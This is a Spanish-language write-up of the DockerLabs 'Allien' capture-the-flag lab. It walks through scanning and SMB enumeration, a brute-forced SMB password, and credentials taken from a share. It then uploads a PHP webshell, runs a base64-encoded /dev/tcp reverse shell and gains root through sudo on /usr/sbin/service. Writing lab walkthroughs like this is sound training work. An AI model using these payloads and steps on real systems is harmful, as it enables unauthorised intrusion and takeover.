# Laboratorio Allien

## Descripción
Writeup del laboratorio **Allien** de DockerLabs - Dificultad: Easy

## Reconocimiento

### Inicialización del laboratorio
Inicializamos el laboratorio Allien con el comando:
```bash
./auto_deploy.sh Allien.tar
```

### Escaneo de puertos
Realizamos un escaneo completo de puertos con nmap:

```bash
nmap 172.17.0.2 -sV -A -p-
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-07 13:49 EDT
Nmap scan report for 172.17.0.2
Host is up (0.000021s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:a1:09:2d:be:05:58:1b:01:20:d7:d0:d8:0d:7b:a6 (ECDSA)
|_  256 cd:98:0b:8a:0b:f9:f5:43:e4:44:5d:33:2f:08:2e:ce (ED25519)
80/tcp  open  http        Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Login
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
MAC Address: 02:42:AC:11:00:02 (Unknown)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-09-07T17:49:22
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: SAMBASERVER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

TRACEROUTE
HOP RTT     ADDRESS
1   0.02 ms 172.17.0.2

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.03 seconds

```

### Resultados del escaneo
Vemos que los puertos **SSH (22)**, **HTTP (80)**, **NetBIOS (139)** y **NetBIOS (445)** están abiertos.

## Explotación Web

### Reconocimiento web inicial
Navegamos a `http://172.17.0.2:80` y veremos un apartado de inicio de sesión común y corriente.

### Enumeración de directorios
Aplicaremos técnicas de fuzzing en el sitio web para obtener los siguientes resultados:

```bash
gobuster dir -t 100 -u "http://172.17.0.2/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
```

**Explicación del comando:**
- **gobuster:** herramienta de fuzzing
- **dir:** modo directory/file
- **-t 100:** número de hilos (peticiones simultáneas)
- **-u:** URL objetivo
- **-w:** wordlist a utilizar
- **-x php:** extensiones de archivo a probar

Gobuster es una herramienta de fuerza bruta para encontrar directorios, archivos y subdominios, tomando cada palabra de un diccionario (wordlist) y probándola en la URL para ver si existe. Este es el resultado:

```
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/info.php             (Status: 200) [Size: 72711]
/index.php            (Status: 200) [Size: 3543]
/productos.php        (Status: 200) [Size: 5229]
/server-status        (Status: 403) [Size: 275]
Progress: 441116 / 441116 (100.00%)
===============================================================
Finished
===============================================================
```

Entramos a `/productos.php` e `/info.php` y vemos que no hay mucho para hacer.

## Enumeración SMB

### Enumeración de usuarios
Ahora nos enfocaremos en los puertos 445 y 139 que están ejecutando Samba. El objetivo es buscar usuarios válidos que podrían ayudarnos a acceder a información compartida por medio de estos servicios, así que haremos enumeración de usuarios con **enum4linux**:

```bash
enum4linux -a 172.17.0.2
```

Lo cual nos dará una parte de salida importante:

```
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''               
                                         
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-5-21-3519099135-2650601337-1395019858 and logon username '', password ''                           
                                            
S-1-5-21-3519099135-2650601337-1395019858-501 SAMBASERVER\nobody (Local User)
S-1-5-21-3519099135-2650601337-1395019858-513 SAMBASERVER\None (Domain Group)
S-1-5-21-3519099135-2650601337-1395019858-1000 SAMBASERVER\usuario1 (Local User)
S-1-5-21-3519099135-2650601337-1395019858-1001 SAMBASERVER\usuario2 (Local User)
S-1-5-21-3519099135-2650601337-1395019858-1002 SAMBASERVER\usuario3 (Local User)
S-1-5-21-3519099135-2650601337-1395019858-1003 SAMBASERVER\satriani7 (Local User)
S-1-5-21-3519099135-2650601337-1395019858-1004 SAMBASERVER\administrador (Local User)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''               
                                            
S-1-22-1-1000 Unix User\ubuntu (Local User)  
S-1-22-1-1001 Unix User\usuario1 (Local User)
S-1-22-1-1002 Unix User\usuario2 (Local User)
S-1-22-1-1003 Unix User\usuario3 (Local User)
S-1-22-1-1004 Unix User\satriani7 (Local User)
S-1-22-1-1005 Unix User\administrador (Local User)

================================( Getting printer info for 172.17.0.2 )================================                               
                                            
No printers returned.                        

enum4linux complete on Sun Sep  7 14:16:05 2025
```

### Ataque de fuerza bruta SMB
Ahora al identificar varios usuarios, usaremos el usuario `satriani7` para llevar a cabo un ataque de fuerza bruta empleando crackmapexec:

```bash
crackmapexec smb 172.17.0.2 -u 'satriani7' -p /usr/share/wordlists/rockyou.txt
```

**Nota:** Si no funciona y arroja este error:
```
SMB         172.17.0.2      445    SAMBASERVER      [*] Windows 6.1 Build 0 (name:SAMBASERVER) (domain:SAMBASERVER) (signing:False) (SMBv1:False)
SMB         172.17.0.2      445    SAMBASERVER      [-] SAMBASERVER\satriani7:/usr/share/wordlists/rockyou.txt STATUS_LOGON_FAILURE
```

Muy probablemente sea que nuestro rockyou.txt sigue comprimido en nuestra máquina Kali, así que comprobaremos eso:

```bash
ls -lh /usr/share/wordlists/rockyou.txt
```

Si no encontramos nada entonces efectivamente está comprimido:
```bash
ls -lh /usr/share/wordlists/ | grep rockyou
```

Si vemos:
```
-rw-r--r-- 1 root root 51M May 12  2023 rockyou.txt.gz
```

Significa que tenemos que descomprimirlo para poderlo usar:
```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

Comprobamos nuevamente:
```bash
ls -lh /usr/share/wordlists/rockyou.txt
# -rw-r--r-- 1 root root 134M May 12  2023 /usr/share/wordlists/rockyou.txt
```

Ahora podremos usar el comando y obtendremos:

```
SMB         172.17.0.2      445    SAMBASERVER      [-] SAMBASERVER\satriani7:0123456789 STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    SAMBASERVER      [-] SAMBASERVER\satriani7:school STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    SAMBASERVER      [-] SAMBASERVER\satriani7:barcelona STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    SAMBASERVER      [-] SAMBASERVER\satriani7:august STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    SAMBASERVER      [-] SAMBASERVER\satriani7:orlando STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    SAMBASERVER      [-] SAMBASERVER\satriani7:samuel STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    SAMBASERVER      [-] SAMBASERVER\satriani7:cameron STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    SAMBASERVER      [-] SAMBASERVER\satriani7:slipknot STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    SAMBASERVER      [-] SAMBASERVER\satriani7:cutiepie STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    SAMBASERVER      [-] SAMBASERVER\satriani7:monkey1 STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    SAMBASERVER      [+] SAMBASERVER\satriani7:50cent 
```

Veremos varios intentos de contraseña pero en especial encontraremos que la que funcionó fue **50cent**.

### Enumeración de recursos compartidos
Ahora usaremos la herramienta `smbmap` para enumerar los recursos compartidos con las credenciales que obtuvimos:

```bash
smbmap -H 172.17.0.2 -u "satriani7" -p "50cent"
```

**Parámetros:**
- **-H:** Host
- **-u:** Usuario
- **-p:** Contraseña

Tendremos lo siguiente:

```
    ________  ___      ___  _______   ___      ___       __         _______
/"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
(:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
\___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
/" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
(_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                    https://github.com/ShawnDEvans/smbmap

[\] Checking for open ports...                                                            [*] Detected 1 hosts serving SMB        
[|] Authenticating...                                                                     [*] Established 1 SMB connections(s) and 1 authenticated session(s)
[/] Authenticating...                                                                     [-] Enumerating shares...                                                                 [\] Enumerating shares...                                                                                                                                                                     
[+] IP: 172.17.0.2:445  Name: 172.17.0.2             Status: NULL Session
        Disk                                                         Permissions     Comment
        ----                                                         -----------     -------
        myshare                                              READ ONLY       Carpeta compartida sin restricciones
        backup24                                             READ ONLY       Privado
        home                                                 NO ACCESS       Produccion
        IPC$                                                 NO ACCESS       IPC Service (EseEmeB Samba Server)
[|] Closing connections..                                                                 [/] Closing connections..                                                                 [-] Closing connections..                                                                                                                                                           [*] Closed 1 connections
```

### Exploración de recursos compartidos
Ahora vamos a ver qué contiene esa carpeta en especial que dice ser `backup24` y privado:

```bash
smbmap -H 172.17.0.2 -u "satriani7" -p "50cent" -r backup24
```

Lo cual obtendremos:

```
        Disk                                                         Permissions     Comment
    ----                                                         -----------     -------
    myshare                                              READ ONLY       Carpeta compartida sin restricciones
    backup24                                             READ ONLY       Privado
    ./backup24
    dr--r--r--                0 Sun Oct  6 03:19:02 2024 .
    dr--r--r--                0 Sun Oct  6 03:19:02 2024 ..
    dr--r--r--                0 Sun Oct  6 03:19:02 2024 CQFO6Q~M
    dr--r--r--                0 Sun Oct  6 03:15:02 2024 Documents
    dr--r--r--                0 Sun Oct  6 03:18:45 2024 Desktop
    dr--r--r--                0 Sun Oct  6 03:15:02 2024 Downloads
    dr--r--r--                0 Sun Oct  6 03:15:02 2024 Videos
    dr--r--r--                0 Sun Oct  6 03:18:50 2024 Temp
    dr--r--r--                0 Sun Oct  6 03:15:02 2024 Pictures
    home                                                 NO ACCESS       Produccion
    IPC$                                                 NO ACCESS       IPC Service (EseEmeB Samba Server)
```

Podemos ver que tiene una carpeta home como siempre la hemos conocido, sin embargo, nos interesa explorar `Documents` para ver si hay algo que nos sirva:

```bash
smbmap -H 172.17.0.2 -u "satriani7" -p "50cent" -r backup24/Documents
```

Lo cual nos muestra:
```
        Disk                                                         Permissions     Comment
    ----                                                         -----------     -------
    myshare                                              READ ONLY       Carpeta compartida sin restricciones
    backup24                                             READ ONLY       Privado
    ./backup24Documents
    dr--r--r--                0 Sun Oct  6 03:15:02 2024 .
    dr--r--r--                0 Sun Oct  6 03:19:02 2024 ..
    dr--r--r--                0 Sun Oct  6 03:15:05 2024 Work
    dr--r--r--                0 Sun Oct  6 03:17:16 2024 Personal
    home                                                 NO ACCESS       Produccion
    IPC$                                                 NO ACCESS       IPC Service (EseEmeB Samba Server)
```

Y ahora nos interesa esa carpeta que dice `Personal` puesto que puede tener credenciales:

```bash
smbmap -H 172.17.0.2 -u "satriani7" -p "50cent" -r backup24/Documents/Personal
```

```
        Disk                                                         Permissions     Comment
    ----                                                         -----------     -------
    myshare                                              READ ONLY       Carpeta compartida sin restricciones
    backup24                                             READ ONLY       Privado
    ./backup24Documents/Personal
    dr--r--r--                0 Sun Oct  6 03:17:16 2024 .
    dr--r--r--                0 Sun Oct  6 03:15:02 2024 ..
    fr--r--r--              902 Sun Oct  6 03:23:28 2024 credentials.txt
    fr--r--r--               15 Sun Oct  6 03:19:56 2024 notes.txt
    home                                                 NO ACCESS       Produccion
    IPC$                                                 NO ACCESS       IPC Service (EseEmeB Samba Server)
```

Y pudimos encontrar un archivo `credentials.txt` el cual podemos usar a nuestro favor.

### Acceso a archivos sensibles
Ahora usaremos `smbclient` para conectarnos, navegar y poder descargar ese archivo de importancia:

```bash
smbclient //172.17.0.2/backup24/ -U satriani7%50cent
```

Lo cual haremos:

```
smb: \> ls
.                                   D        0  Sun Oct  6 03:19:03 2024
..                                  D        0  Sun Oct  6 03:19:03 2024
CQFO6Q~M                            D        0  Sun Oct  6 03:19:03 2024
Documents                           D        0  Sun Oct  6 03:15:03 2024
Desktop                             D        0  Sun Oct  6 03:18:46 2024
Downloads                           D        0  Sun Oct  6 03:15:03 2024
Videos                              D        0  Sun Oct  6 03:15:03 2024
Temp                                D        0  Sun Oct  6 03:18:51 2024
Pictures                            D        0  Sun Oct  6 03:15:03 2024

                58413036 blocks of size 1024. 37125220 blocks available
smb: \> cd Documents\
smb: \Documents\> cd Personal\
smb: \Documents\Personal\> ls
.                                   D        0  Sun Oct  6 03:17:17 2024
..                                  D        0  Sun Oct  6 03:15:03 2024
credentials.txt                     N      902  Sun Oct  6 03:23:29 2024
notes.txt                           N       15  Sun Oct  6 03:19:57 2024

                58413036 blocks of size 1024. 37125220 blocks available
smb: \Documents\Personal\> 
```

Ahora usaremos `get` para poder descargar ese archivo en nuestra máquina:

```bash
get credentials.txt
```

Nos saldremos e iremos a nuestra terminal de nuestra máquina y miraremos qué tiene el archivo `credentials.txt`:

```bash
cat credentials.txt
```

Y veremos que tiene:

```
# Archivo de credenciales

Este documento expone credenciales de usuarios, incluyendo la del usuario administrador.

Usuarios:
-------------------------------------------------
1. Usuario: jsmith
- Contraseña: PassJsmith2024!

2. Usuario: abrown
- Contraseña: PassAbrown2024!

3. Usuario: lgarcia
- Contraseña: PassLgarcia2024!

4. Usuario: kchen
- Contraseña: PassKchen2024!

5. Usuario: tjohnson
- Contraseña: PassTjohnson2024!

6. Usuario: emiller
- Contraseña: PassEmiller2024!

7. Usuario: administrador
    - Contraseña: Adm1nP4ss2024   

8. Usuario: dwhite
- Contraseña: PassDwhite2024!

9. Usuario: nlewis
- Contraseña: PassNlewis2024!

10. Usuario: srodriguez
- Contraseña: PassSrodriguez2024!

# Notas:
- Mantener estas credenciales en un lugar seguro.
- Cambiar las contraseñas periódicamente.
- No compartir estas credenciales sin autorización.
```

## Escalada de Privilegios

### Acceso con credenciales de administrador
Nos enfocaremos en ese usuario `administrador` para repetir el proceso y ver qué recursos compartidos tiene:

```bash
smbmap -H 172.17.0.2 -u "administrador" -p "Adm1nP4ss2024"
```

Veremos el siguiente resultado:
```
        Disk                                                         Permissions     Comment
    ----                                                         -----------     -------
    myshare                                              READ ONLY       Carpeta compartida sin restricciones
    backup24                                             NO ACCESS       Privado
    home                                                 READ, WRITE     Produccion
    IPC$                                                 NO ACCESS       IPC Service (EseEmeB Samba Server)
[\] Closing connection
```

Vemos que tenemos la carpeta `home` disponible, así que nos conectaremos como cliente:

```bash
smbclient //172.17.0.2/home -U administrador%Adm1nP4ss2024
```

Y vemos qué archivos tenemos:

```
smb: \> ls
.                                   D        0  Sun Sep  7 14:48:21 2025
..                                  D        0  Sun Sep  7 14:48:21 2025
info.php                            N       21  Sun Oct  6 03:32:50 2024
styles.css                          N      263  Sun Oct  6 05:22:06 2024
index.php                           N     3543  Sun Oct  6 16:28:45 2024
productos.php                       N     5229  Sun Oct  6 05:21:48 2024
back.png                            N   463383  Sun Oct  6 03:59:29 2024

                58413036 blocks of size 1024. 37124180 blocks available
smb: \> 
```

Y vemos que efectivamente son los mismos archivos que encontramos con el fuzzing.

## Explotación RCE

### Creación de webshell
Lo que podemos hacer ahora es subir un archivo PHP malicioso usando `smbclient` para escalar esto a un RCE (Remote Code Execution).

Regresaremos a nuestra terminal y crearemos nuestro PHP:

```bash
touch pwned.php
nano pwned.php
```

```php
<?php
    system($_GET['cmd'])
?>
```

Y luego regresaremos a la terminal con `smbclient`:

```bash
smb: \> put pwned.php pwned.php
putting file pwned.php as \pwned.php (31.2 kb/s) (average 31.2 kb/s)
smb: \> ls
.                                   D        0  Sun Sep  7 14:55:11 2025
..                                  D        0  Sun Sep  7 14:55:11 2025
info.php                            N       21  Sun Oct  6 03:32:50 2024
pwned.php                           A       32  Sun Sep  7 14:55:11 2025
styles.css                          N      263  Sun Oct  6 05:22:06 2024
index.php                           N     3543  Sun Oct  6 16:28:45 2024
productos.php                       N     5229  Sun Oct  6 05:21:48 2024
back.png                            N   463383  Sun Oct  6 03:59:29 2024

                58413036 blocks of size 1024. 37119052 blocks available
```

Efectivamente pudimos poner nuestro `pwned.php` dentro del directorio home.

### Ejecución remota de comandos
Ahora si navegamos al archivo PHP y le ponemos un parámetro `cmd` veremos que tenemos ejecución de comandos:

```
http://172.17.0.2/pwned.php?cmd=whoami
# www-data 
```

### Reverse Shell
Ahora lanzaremos una shell inversa.

Nos pondremos a escuchar en el puerto 4444 con Netcat en nuestra máquina:

```bash
nc -nvlp 4444
```

Y luego convertimos nuestra shell inversa en Base64:

```bash
echo "sh -i >& /dev/tcp/<ip_maquina_atacante>/4444 0>&1" | base64
```

**Explicación:** Todo lo que escribas en tu máquina irá al shell en la víctima. Todo lo que devuelva la víctima volverá a ti. Estará codificado en base64 para evitar filtros o restricciones.

Y luego ejecutamos en el parámetro `cmd` en el navegador:

```
echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xNi4xMjgvNDQ0NCAwPiYxCg== | base64 -d | bash
```

Y ya estaríamos dentro:

```
listening on [any] 4444 ...
connect to [192.168.16.128] from (UNKNOWN) [172.17.0.2] 52848
sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

### Mejora del TTY
Ahora haremos el tratamiento de la TTY como siempre:

```bash
script /dev/null -c bash
# Ctrl + Z (para suspender la terminal)
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
reset
```

Listo, ahora escalaremos los privilegios.

### Escalada de privilegios
Ejecutaremos `sudo -l`:

```bash
sudo -l
```

```
Matching Defaults entries for www-data on 0648c50d794d:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
use_pty

User www-data may run the following commands on 0648c50d794d:
    (ALL) NOPASSWD: /usr/sbin/service
www-data@0648c50d794d
```

Podemos ver que podemos ejecutar el binario `/usr/sbin/service` sin contraseña, así que nos aprovecharemos de eso para escalar privilegios:

```bash
sudo /usr/sbin/service ../../bin/bash
```

Y por último verificamos quiénes somos:

```bash
whoami
# root
```

## Conclusión

**Máquina completada exitosamente**

### Resumen de la explotación:
1. **Reconocimiento:** Escaneo de puertos con nmap
2. **Enumeración web:** Fuzzing con gobuster  
3. **Enumeración SMB:** Identificación de usuarios con enum4linux
4. **Fuerza bruta:** Crackmapexec contra usuario satriani7
5. **Acceso SMB:** Enumeración de recursos compartidos con smbmap
6. **Extracción de datos:** Descarga de archivo credentials.txt
7. **Escalada lateral:** Acceso con credenciales de administrador
8. **RCE:** Subida de webshell PHP maliciosa
9. **Reverse shell:** Obtención de acceso al sistema
10. **Escalada de privilegios:** Explotación de sudo con /usr/sbin/service

### Vulnerabilidades identificadas:
- Enumeración de usuarios SMB sin autenticación
- Contraseñas débiles en servicios SMB
- Exposición de credenciales en archivos de backup
- Permisos de escritura en directorio web
- Configuración insegura de sudo para www-data

---

**Fecha:** 07 de Septiembre de 2025  
**Dificultad:** Easy  
**Plataforma:** DockerLabs